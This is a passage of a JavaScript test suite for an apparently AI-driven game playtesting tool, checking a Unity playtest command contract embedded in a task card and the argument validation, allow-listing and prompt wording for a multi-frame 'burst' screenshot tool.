  assert.match(card.details, /Do NOT use `Unity -batchmode -projectPath \.`/);

  assert.ok(card.acceptance.some((a) => a.includes(U.PLAYTEST_DRIVER_GUARD)));
  assert.ok(card.acceptance.some((a) => a.includes('unity command playtest state')));
  // A scripts-only card: never routed to the scene worker.
  assert.equal(Scene.isSceneCard(card), false);

  // It survives the to-do store unchanged (no field is cut).
  const stored = normalizeTodo({ ...card, at: 1 });
  for (const key of ['text', 'details', 'verify', 'size', 'model', 'effort']) assert.equal(stored[key], card[key], key);
  assert.deepEqual(stored.acceptance, card.acceptance);
  assert.deepEqual(stored.files, card.files);
});

test('the PlaytestDriver card quotes the exact playtest contract LunaCore parses', () => {
  const { PLAYTEST_CONTRACT } = require('../helpers/playtest-bridge/unityContract.js');
  const card = U.PLAYTEST_DRIVER_CARD;
  assert.equal(U.PLAYTEST_CONTRACT, PLAYTEST_CONTRACT);
  assert.ok(card.details.includes(PLAYTEST_CONTRACT), 'verbatim in the card');
  assert.ok(U.playtestDriverCard().details.includes(PLAYTEST_CONTRACT), 'and in every copy of it');
  // [CliGroupCommand] editor code of group 'playtest', one method per command.
  assert.match(PLAYTEST_CONTRACT, /const string Group = "playtest";/);
  assert.match(PLAYTEST_CONTRACT, /\[CliGroupCommand\(Group, "[^"]+", Effect = CommandEffect\.ReadOnly\)\]\s+internal static ExitCode State\(CommandContext cmd\)/);
  assert.match(PLAYTEST_CONTRACT, /internal static async Task<ExitCode> Input\(CommandContext cmd, \[CliArg\("steps", "[^"]+", Required = true\)\] string steps\)/);
  assert.match(PLAYTEST_CONTRACT, /internal static async Task<ExitCode> Screenshot\(CommandContext cmd\)/);
  // Command names and parameters exactly as pipelineDriver sends them.
  const steps = [{ type: 'key', key: 'Space' }];
  assert.deepEqual(UN.UNITY_PIPELINE.driver('state'), ['playtest state', {}]);
  assert.deepEqual(UN.UNITY_PIPELINE.driver('input', { steps }), ['playtest input', { steps: JSON.stringify(steps) }]);
  assert.deepEqual(UN.UNITY_PIPELINE.driver('screenshot'), ['playtest screenshot', {}]);
  assert.ok(PLAYTEST_CONTRACT.includes('`playtest state`        parameters {}'));
  assert.ok(PLAYTEST_CONTRACT.includes('`playtest input`        parameters {"steps": "<JSON array text>"} - ONE string parameter named steps'));
  assert.ok(PLAYTEST_CONTRACT.includes('`playtest screenshot`   parameters {}'));
  // Every step type the Playtester may send, with tools.js's limits.
  for (const type of ['key', 'button', 'axis', 'click', 'ui', 'wait']) assert.ok(PLAYTEST_CONTRACT.includes(`{"type":"${type}"`), type);
  assert.ok(PLAYTEST_CONTRACT.includes('1 to 50 steps') && PLAYTEST_CONTRACT.includes('"holdMs"?: 0..5000') && PLAYTEST_CONTRACT.includes('"ms": 0..15000'));
  // The answer shapes the parsers read: state (+ combatFeelLog limits), input, screenshot.
  assert.ok(PLAYTEST_CONTRACT.includes('{"scene": <active scene name>'));
  assert.ok(PLAYTEST_CONTRACT.includes('hitStopFrames int 0..600') && PLAYTEST_CONTRACT.includes('timeScale {"from": 0..10'));
  assert.ok(PLAYTEST_CONTRACT.includes('the newest 200 are kept'));
  assert.ok(PLAYTEST_CONTRACT.includes('{"done": <number of steps run>}'));
  assert.ok(PLAYTEST_CONTRACT.includes('{"png": <base64 of the PNG file bytes, no data: prefix>, "width": <px>, "height": <px>}'));
  // Discovery and the built-in fallback per missing command.
  assert.ok(PLAYTEST_CONTRACT.includes('`pipeline list_commands --group playtest --detail compact` ONCE'));
  assert.match(PLAYTEST_CONTRACT, /playtest screenshot\s+-> capture game_view/);
  assert.match(PLAYTEST_CONTRACT, /playtest input\s+-> runtime simulate_key: key and wait steps only/);
  assert.match(PLAYTEST_CONTRACT, /playtest state\s+-> runtime status, scene list_open/);
  assert.ok(normalizeTodo({ ...card, at: 1 }).details.includes(PLAYTEST_CONTRACT), 'the to-do store keeps it whole');
});

test('playtestDriverCard() is a fresh copy, tagged with the run', () => {
  const card = U.playtestDriverCard({ runId: 'abc123' });
  assert.deepEqual(card.tags, [runTag('abc123')]);
  card.files.push('Assets/Evil.cs');
  card.acceptance.length = 0;
  assert.equal(U.PLAYTEST_DRIVER_CARD.files.includes('Assets/Evil.cs'), false);
  assert.ok(U.PLAYTEST_DRIVER_CARD.acceptance.length > 0);
  assert.equal('tags' in U.playtestDriverCard(), false);
});

// ============================================================================
// burst: the Playtester's time-sequence contact sheet, offered by both bridge adapters
// ============================================================================

const TL = require('../helpers/playtest-bridge/tools.js');
const PT = require('../src/lunasworkPlaytest.js');

test('burst is on the allow-list of the electron and unity adapters, and reaches the Playtester argv', async () => {
  const electron = electronWorld();
  const desktop = A.createAdapter('electron', electron.opts);
  await desktop.start(electronProfile);
  const unity = unityWorld();
  const game = A.createAdapter('unity', unity.opts);
  await game.start(unityProfile);
  try {
    for (const [adapter, server] of [[desktop, SERVER_NAMES.electron], [game, SERVER_NAMES.unity]]) {
      const tools = adapter.tools();
      assert.ok(tools.allowedTools.includes(`mcp__${server}__burst`), server);
      const argv = PT.buildPlaytestArgs({ model: 'sonnet', tools });
      const allowed = argv[argv.indexOf('--allowedTools') + 1].split(',');
      assert.ok(allowed.includes(`mcp__${server}__burst`), `${server} argv`);
    }
  } finally {
    await desktop.stop();
    await game.stop();
  }
});

test('burst args: name gets the burst- prefix, windowId only on electron, defaults fill in', () => {
  assert.deepEqual(TL.checkArgs('unity', 'burst', { name: 'slash-hitstop' }), {
    ok: true,
    args: { name: 'burst-slash-hitstop.png', frames: TL.BURST_DEFAULT_FRAMES, durationMs: TL.BURST_DEFAULT_DURATION_MS },
  });
  assert.deepEqual(TL.checkArgs('electron', 'burst', { name: 'burst-menu-open.png', windowId: 3, frames: 6, durationMs: 800, extra: 'x' }), {
    ok: true,
    args: { name: 'burst-menu-open.png', frames: 6, durationMs: 800, windowId: 3 },
  });
  assert.equal('windowId' in TL.checkArgs('unity', 'burst', { name: 'a', windowId: 3 }).args, false);
  assert.equal(TL.BURST_DEFAULT_FRAMES, 8);
  assert.equal(TL.BURST_DEFAULT_DURATION_MS, 1200);
});

test('burst args: frames clamp to 4..12 and durationMs to 500..1500, rounded; non-numbers are refused', () => {
  const opts = (raw) => TL.checkArgs('unity', 'burst', { name: 'b', ...raw }).args;
  assert.deepEqual(opts({ frames: 1, durationMs: 10 }), { name: 'burst-b.png', frames: 4, durationMs: 500 });
  assert.deepEqual(opts({ frames: 99, durationMs: 60000 }), { name: 'burst-b.png', frames: 12, durationMs: 1500 });
  assert.deepEqual(opts({ frames: -5, durationMs: -1 }), { name: 'burst-b.png', frames: 4, durationMs: 500 });
  assert.deepEqual(opts({ frames: 6.6, durationMs: 999.4 }), { name: 'burst-b.png', frames: 7, durationMs: 999 });
  assert.deepEqual(opts({ frames: null, durationMs: null }), { name: 'burst-b.png', frames: 8, durationMs: 1200 });
  assert.deepEqual(TL.burstOptions({ frames: 12, durationMs: 1500 }), { frames: 12, durationMs: 1500 });
  assert.deepEqual(TL.burstOptions(undefined), { frames: 8, durationMs: 1200 });
  for (const bad of [{ frames: '8' }, { frames: Number.NaN }, { durationMs: Infinity }, { durationMs: [1000] }]) {
    assert.equal(TL.checkArgs('unity', 'burst', { name: 'b', ...bad }).ok, false, JSON.stringify(bad));
  }
  for (const name of ['../x', 'CON', '', 'a'.repeat(79)]) {
    assert.equal(TL.checkArgs('electron', 'burst', { name }).ok, false, name);
  }
});

test('burst in the Playtester prompts of both bridge targets, and the Critic caption when a sheet is cited', () => {
  for (const target of ['electron', 'unity']) {
    const prompt = PT.buildPlaytestPrompt({ mode: 'explore', target, testPlan: 'x', shipCriteria: 'y' });
    assert.match(prompt, /use burst: 4-12 frames over 500-1500 ms/, target);
    assert.match(prompt, /"burst-<name>\.png"/, target);
  }
  const { buildCriticPrompt } = require('../src/lunasworkCriticPrompt.js');
  const { BURST_CAPTION } = require('../helpers/playtest-bridge/burst.js');
  const gate = { gates: [], current: 'M1', currentPassed: false };
  const docs = { shipCriteria: '', testPlan: '', architecture: '', decisions: '', playtestLog: '' };
  const base = { iteration: 2, docs, history: [], gitLog: '', openCards: [], gate };
  const finding = (screenshot) => ({ kind: 'feel', title: 'Hit-stop too long', screenshot });
  const withSheet = buildCriticPrompt({ ...base, report: { findings: [finding('C:\\runs\\iter-2\\burst-slash.png')] } });
  assert.ok(withSheet.includes(BURST_CAPTION));
  const viaScore = buildCriticPrompt({ ...base, report: { scores: [{ evidence: { screenshot: '/runs/iter-2/Burst-dash.png' } }] } });
  assert.ok(viaScore.includes(BURST_CAPTION));
  const plain = buildCriticPrompt({ ...base, report: { findings: [finding('/runs/iter-2/f1-menu.png')] } });
  assert.ok(!plain.includes(BURST_CAPTION));
});
